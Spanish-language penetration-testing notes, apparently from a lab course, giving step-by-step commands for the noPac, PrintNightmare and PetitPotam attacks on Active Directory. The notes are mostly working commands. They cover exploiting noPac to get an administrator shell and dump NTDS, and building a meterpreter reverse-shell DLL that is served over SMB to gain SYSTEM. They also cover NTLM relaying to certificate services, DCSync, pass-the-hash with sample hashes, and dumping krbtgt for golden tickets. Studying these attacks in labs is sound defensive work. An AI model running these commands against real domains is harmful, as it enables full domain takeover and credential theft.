## NoPAC (Envenenamiento SamAccountName)

Por defecto, cualquier **usuario autenticado** en un dominio Active Directory puede **añadir hasta 10 hosts al dominio** ([fuente oficial de Microsoft](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/add-workstations-to-domain)).
El ataque noPac explota dos vulnerabilidades de Kerberos:
- **CVE-2021-42287** – Error de validación en los tickets TGT.
- **CVE-2021-42278** – Permite suplantar controladores de dominio (DC) mediante la manipulación de atributos `SamAccountName`.
### **Concepto del Ataque:**
1. **Creación de un host con el mismo nombre (`SamAccountName`) que un DC.**
2. Solicitar un **Ticket de Servicio (TGS)** para este host manipulado.
3. Kerberos **asocia erróneamente el TGS al DC real**, permitiendo obtener privilegios elevados.
Se puede revisar una referencia técnica [aquí](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
### Ataque con herramienta [noPac](https://github.com/Ridter/noPac)
- Comprobar que el sistema es vulnerable:
	```bash
	sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
	```
- Obtener una shell con privilegios elevados suplantando a `administrator` (`smbexec.py`)
    ```bash
    sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
    ```
    Genera una shell en la que hay que utilizar paths absolutos en lugar de navegar naturalmente con `cd` . Ejecutar esta herramienta guarda el ticket `TGT`  tipo `ccache` que puede ser utilizado para un ptt
    
- DCSync y vuelco de credenciales de `administrator` (`secretsdump.py`)
    ```bash
     sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
    ```
    El comando crearía un archivo de tipo `ccache` que podría ser utilizado para un ptt
    
- Volcado completo NTDS.dit
    ```bash
    sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dum
    ```

## PrintNightmare
Vulnerabilidad en el servicio de la cola de impresión que corre en todos los sistemas Windows. Se pone un ejemplo de como conseguir un `SYSTEM` shell en un DC que corre un Windows Server 2019
### Herramienta cube0x0
Esta versión puede requerir desinstalar la versión de impacket que tenemos en nuestro sistema e instalar la versión de cube0x0
```bash
git clone <https://github.com/cube0x0/CVE-2021-1675.git>
pip3 uninstall impacket
git clone <https://github.com/cube0x0/impacket>
cd impacket
python3 ./setup.py install
```
### Comprobar servicio  MS-RPRN activo
**MS-RPRN** se refiere al **Microsoft Remote Procedure Call (RPC) Print Spooler Service**, un protocolo que permite a las aplicaciones administrar impresoras y trabajos de impresión.
```bash
impacket-rpcdump  @$target | egrep 'MS-RPRN|MS-PAR'
```
Si este comando devuelve resultados es que el servicio está activo
### Ejecución del ataque
- Generamos un payload DLL con `msfvenom`
	```bash
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
	```
- Alojamos el payload en SMB con `smbserver.py`
	```bash
	sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
	```
- Nos ponemos en escucha con `metasploit`
	```bash
	use exploit/multi/handler
	set PAYLOAD windows/x64/meterpreter/reverse_tcp
	set LHOST 172.16.5.225
	set LPORT 8080
	run
	```
- Ejecutamos el script
	```bash
	sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@$target '\\\\172.16.5.225\\CompData\\backupscript.dll'
	```
Esto nos devolverá una shell en `$target` en la que seremos `nt authority\\system`
## PetitPotam
La idea del ataque es retransmitir una petición del DC a la página del host de Certificate Authority (CA), realizando una solicitud de firma de certificado (CRS) para un nuevo certificado digital. Este certificado se puedo utilizar con herramientas como `Rubeus` o `gettgtpkinit.py`  de [PKINITtools](https://github.com/dirkjanm/PKINITtools) para hacer una petición de un TGT para el DC, que puede ser utilizado para comprometer el dominio vía DCSync attack

[Artículo de blog](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) en donde se explica con más detalle este ataque
### ntmrelay.py
Para hacer correr esta herramienta, primero necesitamos la URL del CA host. Se podría utilizar una herramienta como [certi](https://github.com/zer1t0/certi) para encontrar esta información si no sabemos dónde está
```bash
sudo ntlmrelayx.py -debug -smb2support --target <http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp> --adcs --template DomainController
```
Notar que en este caso el target es la URL del AD CS, `-template DomainController` puede permitir generar un certificado con privilegios de dominio
### Ejecutar petitPotam.py
En otra ventana corremos la herramienta [petitpotam.py](https://github.com/topotam/PetitPotam) , aunque también hay una herramienta de powershell, [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)
```bash
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
Esto debería darnos en la otra ventana un certificado en base 64

### Petición de ticket TGT
Se utilizará la herramienta `gettgtpkinit.py` de [pkinit tools](https://github.com/dirkjanm/PKINITtools) para hacer una petición de ticket TGT al DC a partir del certificado
```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
Este ticket tendrá la siguiente forma: `dc01.ccache`
Se mostrará una `encription key` que podremos utilizar junto con `getnthash.py`

### Uso TGT - DCSync (Linux)
- En nuestra máquina atacante añadimos el ticket `ccache` , para que nuestra máquina atacante utilice autenticación kerberos
    ```bash
    export KRB5CCNAME=dc01.ccache
    ```
- Hacemos DSync con [`secretsdump.py`](http://secretsdump.py) para obtener el hash de administrador
    ```bash
    secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
    ```
- Comprobamos acceso haciendo pth
    ```bash
    nxc smb $target -u administrator -H 88ad09182de639ccc6579eb0849751cf
    ```
    

### Uso TGT - [**`getnthash.py`](http://getnthash.py) (Linux)**

- Con la llave obtenida al solicitar el ticket, podemos generar un `nthash` del siguiente modo:
	```bash
    python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
	```
- Podemos utilizar este hash para hacer DCSync con secretsdump.py y pth
	```bash
	secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
	```

### Uso TGT - PTT con Rubeus/mimikatz (Windows)

Con el ticket en base64, podemos hacer un ptt directamente:
```powershell
 .\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

Podríamos comprobar que el ticket está en memoria escribiendo `klist`

A continuación podríamos utilizar mimikatz para solicitar el hash nt de la cuenta que queramos. Ej con `krbtgt`, que permitiría persistencia al poder crear golden tickets

```powershell
lsadump::dcsync /user:inlanefreight\\krbtgt
```